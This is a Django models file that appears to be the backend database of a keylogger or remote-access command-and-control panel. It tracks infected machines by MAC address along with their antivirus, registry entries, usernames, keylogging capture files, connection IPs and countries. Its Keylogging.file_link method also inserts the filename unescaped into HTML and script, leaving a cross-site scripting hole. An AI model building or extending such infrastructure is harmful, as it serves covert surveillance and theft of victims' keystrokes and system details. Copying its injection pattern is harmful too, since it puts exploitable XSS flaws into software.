from django.db import models
import datetime

# Create your models here.
class System_Information(models.Model):
	mac_address = models.CharField(max_length=20, unique=True, primary_key=True)
	op_system = models.CharField(max_length=30, default='None')
	cpu = models.CharField(max_length=20, default='None')
	connection_allowed = models.BooleanField(default=True)
	created = models.DateTimeField(auto_now_add=True, null=True)
	def __str__(self):
		return self.mac_address

class Antivirus(models.Model):
	mac_address = models.ForeignKey(System_Information)
	antivirus_detected = models.CharField(max_length=40)
	def __str__(self):
		return self.antivirus_detected

class Registry(models.Model):
	mac_address = models.ForeignKey(System_Information)
	registry = models.CharField(max_length=40)
	def __str__(self):
		return self.registry

class User(models.Model):
	mac_address = models.ForeignKey(System_Information)
	username = models.CharField(max_length=40)
	def __str__(self):
		return self.username

class Keylogging(models.Model):
	mac_address = models.ForeignKey(System_Information)
	filename = models.CharField(max_length=20)
	timestamp = models.DateTimeField(auto_now_add=True)

	def file_link(self):
		return ("<script>function test(){var win = window.open('/database/api/get_file?filename="+self.filename+"&mac_address="+str(self.mac_address)+"', 'test'); win.focus();}</script><a href='#' id='link' onclick='test()'>"+self.filename+".txt</a>")

	file_link.allow_tags = True

	def __str__(self):
		return self.filename


class Connection(models.Model):
	mac_address = models.ForeignKey(System_Information)
	ip_address = models.CharField(max_length=20)
	connection_type = models.CharField(max_length=60, default='NA')
	timestamp = models.DateTimeField(auto_now_add=True)

	def __str__(self):
		return self.ip_address

class Location(models.Model):
	ip_address = models.ForeignKey(Connection)
	country = models.CharField(max_length=5)
	def __str__(self):
		return self.country